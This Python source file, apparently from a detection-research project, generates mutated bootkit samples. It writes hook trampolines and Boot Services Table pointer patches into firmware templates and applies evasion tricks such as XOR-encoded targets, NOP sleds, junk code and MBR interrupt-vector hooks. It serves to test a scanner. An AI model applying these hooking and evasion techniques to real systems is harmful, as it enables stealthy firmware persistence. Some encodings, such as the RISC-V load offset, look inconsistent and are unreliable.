"""
Bootkit Mutator - Mutation strategies for generating novel bootkit variants.

Implements trampoline obfuscation, encryption wrappers, polymorphic stubs,
and hook target randomization to create diverse bootkit samples that
challenge the scanner's detection capabilities.

Copyright (c) 2026, Barzakh Research Project
SPDX-License-Identifier: BSD-2-Clause-Patent
"""

import struct
import zlib
import hashlib
from dataclasses import dataclass
from enum import Enum, auto
from typing import List, Optional, Tuple

from .templates import (
    Architecture, BootkitTemplate, HookSlot, HookTarget,
    BST_FUNCTION_OFFSETS,
)


class MutationStrategy(Enum):
    MOV_RAX_JMP = auto()         # MOV RAX, imm64; JMP RAX (classic)
    PUSH_RET = auto()            # PUSH imm32; RET (32-bit only)
    JMP_RIP_INDIRECT = auto()    # JMP [RIP+offset] with literal pool
    MOV_STACK_RET = auto()       # MOV [RSP], addr; RET (stack-based)
    LEA_JMP = auto()             # LEA RAX, [RIP+offset]; JMP RAX
    CALL_POP_JMP = auto()        # CALL $+5; POP RAX; ADD RAX, offset; JMP RAX
    XOR_DECODE_JMP = auto()      # XOR-encoded target with inline decoder
    MULTI_STAGE = auto()         # Split across two trampolines
    AARCH64_LDR_BR = auto()      # LDR X16, [PC+8]; BR X16
    AARCH64_ADRP_ADD_BR = auto() # ADRP X16, page; ADD X16, offset; BR X16
    RISCV_AUIPC_JALR = auto()    # AUIPC t1, 0; LD t1, 8(t1); JALR x0, t1, 0
    MBR_INT13H_HOOK = auto()     # Legacy INT 13h IVT overwrite
    MBR_INT15H_HOOK = auto()     # Legacy INT 15h IVT overwrite
    NOP_SLED_PREFIX = auto()     # NOP sled before trampoline (evasion)
    JUNK_INSERT = auto()         # Dead code insertion between instructions


@dataclass
class MutationResult:
    """Result of applying a mutation to a template."""
    data: bytearray
    strategy: MutationStrategy
    hook_target: HookTarget
    hook_address: int
    trampoline_offset: int
    description: str
    difficulty: int  # 1-5, higher = harder to detect


class BootkitMutator:
    """Applies mutation strategies to bootkit templates."""

    def __init__(self, seed: int = 0):
        self._counter = seed

    def _next_addr(self) -> int:
        """Generate a deterministic 'hook target' address."""
        self._counter += 1
        h = hashlib.md5(struct.pack('<I', self._counter)).digest()
        addr = struct.unpack('<Q', h[:8])[0]
        # Keep in a plausible non-FV region (outside 0x7E000000 range)
        return 0x80000000 + (addr & 0x0FFFFFFF)

    def mutate(self, template: BootkitTemplate, strategy: MutationStrategy,
               slot_index: int = 0) -> MutationResult:
        """
        Apply a mutation strategy to a template's hook slot.

        Args:
            template: Base template to mutate
            strategy: Mutation strategy to apply
            slot_index: Which hook slot to fill (default: first)

        Returns:
            MutationResult with the mutated binary
        """
        t = template.clone()
        slot = t.hook_slots[slot_index]
        hook_addr = self._next_addr()

        if t.arch == Architecture.X64:
            return self._mutate_x64(t, slot, strategy, hook_addr)
        elif t.arch == Architecture.AARCH64:
            return self._mutate_aarch64(t, slot, strategy, hook_addr)
        elif t.arch == Architecture.RISCV64:
            return self._mutate_riscv64(t, slot, strategy, hook_addr)
        elif t.arch == Architecture.LEGACY_MBR:
            return self._mutate_mbr(t, slot, strategy, hook_addr)
        else:
            raise ValueError(f"Unsupported architecture: {t.arch}")

    def _mutate_x64(self, template: BootkitTemplate, slot: HookSlot,
                    strategy: MutationStrategy, hook_addr: int) -> MutationResult:
        """Apply x86_64 mutation strategies."""
        data = template.data
        off = slot.offset
        difficulty = 1

        if strategy == MutationStrategy.MOV_RAX_JMP:
            # 48 B8 <imm64>; FF E0
            trampoline = bytearray(12)
            trampoline[0] = 0x48
            trampoline[1] = 0xB8
            struct.pack_into('<Q', trampoline, 2, hook_addr)
            trampoline[10] = 0xFF
            trampoline[11] = 0xE0
            data[off:off+12] = trampoline
            difficulty = 1

        elif strategy == MutationStrategy.PUSH_RET:
            # 68 <imm32>; C3
            trampoline = bytearray(6)
            trampoline[0] = 0x68
            struct.pack_into('<I', trampoline, 1, hook_addr & 0xFFFFFFFF)
            trampoline[5] = 0xC3
            data[off:off+6] = trampoline
            difficulty = 2

        elif strategy == MutationStrategy.JMP_RIP_INDIRECT:
            # FF 25 00 00 00 00; <64-bit addr at [RIP+0]>
            trampoline = bytearray(14)
            trampoline[0] = 0xFF
            trampoline[1] = 0x25
            struct.pack_into('<I', trampoline, 2, 0)  # RIP-relative offset = 0 (addr follows)
            struct.pack_into('<Q', trampoline, 6, hook_addr)
            data[off:off+14] = trampoline
            difficulty = 2

        elif strategy == MutationStrategy.MOV_STACK_RET:
            # 48 C7 04 24 <lo32>; C7 44 24 04 <hi32>; C3
            lo = hook_addr & 0xFFFFFFFF
            hi = (hook_addr >> 32) & 0xFFFFFFFF
            trampoline = bytearray(17)
            trampoline[0:4] = b'\x48\xC7\x04\x24'
            struct.pack_into('<I', trampoline, 4, lo)
            trampoline[8:12] = b'\xC7\x44\x24\x04'
            struct.pack_into('<I', trampoline, 12, hi)
            trampoline[16] = 0xC3
            data[off:off+17] = trampoline
            difficulty = 3

        elif strategy == MutationStrategy.LEA_JMP:
            # LEA RAX, [RIP+offset]; JMP RAX
            # 48 8D 05 <rel32>; FF E0; ... <padding>... [target addr at known offset]
            # Place target address 16 bytes after LEA instruction start
            # LEA rel32 = target_pos - (lea_pos + 7)
            target_pos = off + 16
            rel32 = target_pos - (off + 7)
            trampoline = bytearray(24)
            trampoline[0:3] = b'\x48\x8D\x05'
            struct.pack_into('<i', trampoline, 3, rel32)
            trampoline[7] = 0xFF
            trampoline[8] = 0xE0
            # NOP fill between
            for i in range(9, 16):
                trampoline[i] = 0x90
            struct.pack_into('<Q', trampoline, 16, hook_addr)
            data[off:off+24] = trampoline
            difficulty = 3

        elif strategy == MutationStrategy.CALL_POP_JMP:
            # CALL $+5; POP RAX; ADD RAX, offset; JMP RAX
            # E8 00 00 00 00; 58; 48 05 <imm32>; FF E0
            # After POP, RAX = address of POP instruction
            # We want RAX = hook_addr, so offset = hook_addr - pop_addr
            # pop_addr = off + 5 (after CALL)
            # But since hook_addr is arbitrary, use offset to literal pool instead
            # Place hook_addr at off+20, so offset = 20 - 5 = 15 bytes from POP
            # Actually: after CALL $+5, POP puts (off+5) into RAX
            # We need ADD RAX, (addr_of_literal - (off+5))
            # Literal at off+16: ADD offset = 16 - 5 = 11
            # Then JMP [RAX] instead of JMP RAX... let's simplify:
            # E8 00 00 00 00 (5); 58 (1); 48 83 C0 0B (4); FF 20 (2) = 12; <addr> at 16
            # Wait, 48 83 C0 only does 8-bit imm. Use 48 05 for imm32.
            # E8 00 00 00 00; 58; 48 05 <rel32>; FF E0
            # After POP: RAX = off+5. ADD RAX, (hook_addr - (off+5)): too large for imm32 if addr is high
            # Better approach: CALL $+5; POP RCX; MOV RAX, [RCX+offset_to_pool]; JMP RAX
            # E8 00 00 00 00; 59; 48 8B 41 0B; FF E0; <8 bytes addr>
            # offset_to_pool = (off+16) - (off+5) - (offset_within_instr) = 11 from RCX
            trampoline = bytearray(24)
            trampoline[0:5] = b'\xE8\x00\x00\x00\x00'  # CALL $+5
            trampoline[5] = 0x59                        # POP RCX
            trampoline[6:10] = b'\x48\x8B\x41\x0A'     # MOV RAX, [RCX+10]
            # RCX = off+5, [RCX+10] = off+15... we need addr at off+16
            # Actually RCX points to instruction after CALL = off+5
            # MOV RAX, [RCX+11] = 48 8B 41 0B
            trampoline[6:10] = b'\x48\x8B\x41\x0B'     # MOV RAX, [RCX+11]
            trampoline[10] = 0xFF                       # JMP RAX
            trampoline[11] = 0xE0
            # Padding
            for i in range(12, 16):
                trampoline[i] = 0x90
            struct.pack_into('<Q', trampoline, 16, hook_addr)
            data[off:off+24] = trampoline
            difficulty = 4

        elif strategy == MutationStrategy.XOR_DECODE_JMP:
            # XOR-encoded address with inline single-byte key decoder
            key = (self._counter & 0xFF) or 0x41  # Avoid zero key
            encoded_addr = hook_addr ^ (key * 0x0101010101010101)
            # MOV RAX, encoded; MOV CL, key; XOR byte loop or just XOR RAX, mask; JMP RAX
            # Simplest: MOV RAX, encoded_imm64; MOV RCX, key_mask; XOR RAX, RCX; JMP RAX
            key_mask = key * 0x0101010101010101
            trampoline = bytearray(32)
            # MOV RAX, encoded (48 B8 <imm64>)
            trampoline[0:2] = b'\x48\xB8'
            struct.pack_into('<Q', trampoline, 2, encoded_addr & 0xFFFFFFFFFFFFFFFF)
            # MOV RCX, key_mask (48 B9 <imm64>)
            trampoline[10:12] = b'\x48\xB9'
            struct.pack_into('<Q', trampoline, 12, key_mask & 0xFFFFFFFFFFFFFFFF)
            # XOR RAX, RCX (48 31 C8)
            trampoline[20:23] = b'\x48\x31\xC8'
            # JMP RAX (FF E0)
            trampoline[23:25] = b'\xFF\xE0'
            data[off:off+25] = trampoline[:25]
            difficulty = 4

        elif strategy == MutationStrategy.MULTI_STAGE:
            # First trampoline jumps to second trampoline within the same region
            # Stage 1 at slot offset: JMP short to stage 2
            # Stage 2 at slot offset + 32: MOV RAX, addr; JMP RAX
            stage2_off = off + 32
            rel8 = 32 - 2  # JMP short is 2 bytes, relative to next instruction
            trampoline_s1 = bytearray(2)
            trampoline_s1[0] = 0xEB  # JMP short
            trampoline_s1[1] = rel8 & 0xFF
            data[off:off+2] = trampoline_s1

            # Stage 2: MOV RAX, imm64; JMP RAX
            trampoline_s2 = bytearray(12)
            trampoline_s2[0:2] = b'\x48\xB8'
            struct.pack_into('<Q', trampoline_s2, 2, hook_addr)
            trampoline_s2[10:12] = b'\xFF\xE0'
            data[stage2_off:stage2_off+12] = trampoline_s2
            difficulty = 3

        elif strategy == MutationStrategy.NOP_SLED_PREFIX:
            # NOP sled (variable length) followed by MOV RAX; JMP RAX
            nop_count = (self._counter % 8) + 4  # 4-11 NOPs
            trampoline = bytearray(nop_count + 12)
            for i in range(nop_count):
                trampoline[i] = 0x90
            trampoline[nop_count] = 0x48
            trampoline[nop_count+1] = 0xB8
            struct.pack_into('<Q', trampoline, nop_count + 2, hook_addr)
            trampoline[nop_count+10] = 0xFF
            trampoline[nop_count+11] = 0xE0
            data[off:off+len(trampoline)] = trampoline
            difficulty = 2

        elif strategy == MutationStrategy.JUNK_INSERT:
            # Junk instructions (dead code) interleaved with real trampoline
            # PUSH RBX; MOV RBX, 0; POP RBX; <real trampoline>
            junk = bytes([
                0x53,                               # PUSH RBX
                0x48, 0xBB,                         # MOV RBX, imm64
            ]) + struct.pack('<Q', 0xDEADC0DE) + bytes([
                0x5B,                               # POP RBX
            ])
            real = bytearray(12)
            real[0:2] = b'\x48\xB8'
            struct.pack_into('<Q', real, 2, hook_addr)
            real[10:12] = b'\xFF\xE0'
            full = bytearray(junk) + real
            data[off:off+len(full)] = full
            difficulty = 3

        else:
            # Fallback: basic MOV RAX; JMP RAX
            trampoline = bytearray(12)
            trampoline[0:2] = b'\x48\xB8'
            struct.pack_into('<Q', trampoline, 2, hook_addr)
            trampoline[10:12] = b'\xFF\xE0'
            data[off:off+12] = trampoline
            difficulty = 1

        # Update BST pointer to point to hook code
        self._patch_bst_pointer(data, template.bst_offset, slot.target, off)

        return MutationResult(
            data=data,
            strategy=strategy,
            hook_target=slot.target,
            hook_address=hook_addr,
            trampoline_offset=off,
            description=f'{strategy.name} trampoline at 0x{off:x} targeting {slot.target.value}',
            difficulty=difficulty,
        )

    def _mutate_aarch64(self, template: BootkitTemplate, slot: HookSlot,
                        strategy: MutationStrategy, hook_addr: int) -> MutationResult:
        """Apply ARM64 mutation strategies."""
        data = template.data
        off = slot.offset
        difficulty = 1

        if strategy == MutationStrategy.AARCH64_LDR_BR:
            # LDR X16, [PC+8]; BR X16; <64-bit addr>
            trampoline = bytearray(16)
            struct.pack_into('<I', trampoline, 0, 0x58000050)  # LDR X16, #8
            struct.pack_into('<I', trampoline, 4, 0xD61F0200)  # BR X16
            struct.pack_into('<Q', trampoline, 8, hook_addr)
            data[off:off+16] = trampoline
            difficulty = 1

        elif strategy == MutationStrategy.AARCH64_ADRP_ADD_BR:
            # ADRP X16, 0; ADD X16, X16, #0; BR X16
            # (simplified — in reality ADRP needs page-relative offset)
            # For testing: use MOVZ/MOVK sequence instead (more detectable)
            # MOVZ X16, #lo16; MOVK X16, #hi16, LSL#16; MOVK X16, #hi32, LSL#32; BR X16
            lo16 = hook_addr & 0xFFFF
            hi16 = (hook_addr >> 16) & 0xFFFF
            hi32 = (hook_addr >> 32) & 0xFFFF
            hi48 = (hook_addr >> 48) & 0xFFFF
            trampoline = bytearray(20)
            # MOVZ X16, #lo16
            struct.pack_into('<I', trampoline, 0, 0xD2800010 | (lo16 << 5))
            # MOVK X16, #hi16, LSL#16
            struct.pack_into('<I', trampoline, 4, 0xF2A00010 | (hi16 << 5))
            # MOVK X16, #hi32, LSL#32
            struct.pack_into('<I', trampoline, 8, 0xF2C00010 | (hi32 << 5))
            # MOVK X16, #hi48, LSL#48
            struct.pack_into('<I', trampoline, 12, 0xF2E00010 | (hi48 << 5))
            # BR X16
            struct.pack_into('<I', trampoline, 16, 0xD61F0200)
            data[off:off+20] = trampoline
            difficulty = 3

        else:
            # Default: LDR X16 + BR X16
            trampoline = bytearray(16)
            struct.pack_into('<I', trampoline, 0, 0x58000050)
            struct.pack_into('<I', trampoline, 4, 0xD61F0200)
            struct.pack_into('<Q', trampoline, 8, hook_addr)
            data[off:off+16] = trampoline
            difficulty = 1

        self._patch_bst_pointer(data, template.bst_offset, slot.target, off)

        return MutationResult(
            data=data,
            strategy=strategy,
            hook_target=slot.target,
            hook_address=hook_addr,
            trampoline_offset=off,
            description=f'AARCH64 {strategy.name} at 0x{off:x}',
            difficulty=difficulty,
        )

    def _mutate_riscv64(self, template: BootkitTemplate, slot: HookSlot,
                        strategy: MutationStrategy, hook_addr: int) -> MutationResult:
        """Apply RISC-V mutation strategies."""
        data = template.data
        off = slot.offset
        difficulty = 1

        # AUIPC t1, 0; LD t1, 8(t1); JALR x0, t1, 0; <64-bit addr>
        trampoline = bytearray(20)
        struct.pack_into('<I', trampoline, 0, 0x00000317)   # AUIPC t1, 0
        struct.pack_into('<I', trampoline, 4, 0x00833303)   # LD t1, 8(t1)
        struct.pack_into('<I', trampoline, 8, 0x00030067)   # JALR x0, t1, 0
        struct.pack_into('<Q', trampoline, 12, hook_addr)
        data[off:off+20] = trampoline

        self._patch_bst_pointer(data, template.bst_offset, slot.target, off)

        return MutationResult(
            data=data,
            strategy=strategy,
            hook_target=slot.target,
            hook_address=hook_addr,
            trampoline_offset=off,
            description=f'RISC-V AUIPC+LD+JALR at 0x{off:x}',
            difficulty=difficulty,
        )

    def _mutate_mbr(self, template: BootkitTemplate, slot: HookSlot,
                    strategy: MutationStrategy, hook_addr: int) -> MutationResult:
        """Apply legacy MBR mutation strategies."""
        data = template.data
        off = slot.offset
        difficulty = 1

        if strategy == MutationStrategy.MBR_INT13H_HOOK:
            # Write INT 13h IVT vector (0x004C) with hook address
            # MOV WORD [004Ch], hook_lo; MOV WORD [004Eh], hook_seg
            hook_lo = hook_addr & 0xFFFF
            hook_seg = 0x0000
            code = bytearray([
                0xC7, 0x06, 0x4C, 0x00,             # MOV WORD [004Ch],
            ])
            code += struct.pack('<H', hook_lo)       # hook offset
            code += bytearray([
                0xC7, 0x06, 0x4E, 0x00,             # MOV WORD [004Eh],
            ])
            code += struct.pack('<H', hook_seg)      # hook segment
            data[off:off+len(code)] = code
            difficulty = 1

        elif strategy == MutationStrategy.MBR_INT15H_HOOK:
            # Write INT 15h IVT vector (0x0054)
            hook_lo = hook_addr & 0xFFFF
            hook_seg = 0x0000
            code = bytearray([
                0xC7, 0x06, 0x54, 0x00,
            ])
            code += struct.pack('<H', hook_lo)
            code += bytearray([
                0xC7, 0x06, 0x56, 0x00,
            ])
            code += struct.pack('<H', hook_seg)
            data[off:off+len(code)] = code
            difficulty = 1

        else:
            # Default: INT 13h hook
            hook_lo = hook_addr & 0xFFFF
            code = bytearray([0xC7, 0x06, 0x4C, 0x00])
            code += struct.pack('<H', hook_lo)
            code += bytearray([0xC7, 0x06, 0x4E, 0x00, 0x00, 0x00])
            data[off:off+len(code)] = code
            difficulty = 1

        return MutationResult(
            data=data,
            strategy=strategy,
            hook_target=slot.target,
            hook_address=hook_addr,
            trampoline_offset=off,
            description=f'MBR {strategy.name} at 0x{off:x}',
            difficulty=difficulty,
        )

    def _patch_bst_pointer(self, data: bytearray, bst_offset: int,
                           target: HookTarget, hook_code_offset: int):
        """Patch the BST function pointer to point to the hook code."""
        if target not in BST_FUNCTION_OFFSETS:
            return
        func_offset = BST_FUNCTION_OFFSETS[target]
        ptr_location = bst_offset + func_offset
        if ptr_location + 8 <= len(data):
            struct.pack_into('<Q', data, ptr_location, hook_code_offset)

    def recalculate_bst_crc32(self, data: bytearray, bst_offset: int, header_size: int = 240):
        """Recalculate and patch BST CRC32 after modification."""
        if bst_offset + header_size > len(data):
            return
        bst_region = bytearray(data[bst_offset:bst_offset + header_size])
        bst_region[16:20] = b'\x00\x00\x00\x00'
        crc = zlib.crc32(bst_region) & 0xFFFFFFFF
        struct.pack_into('<I', data, bst_offset + 16, crc)
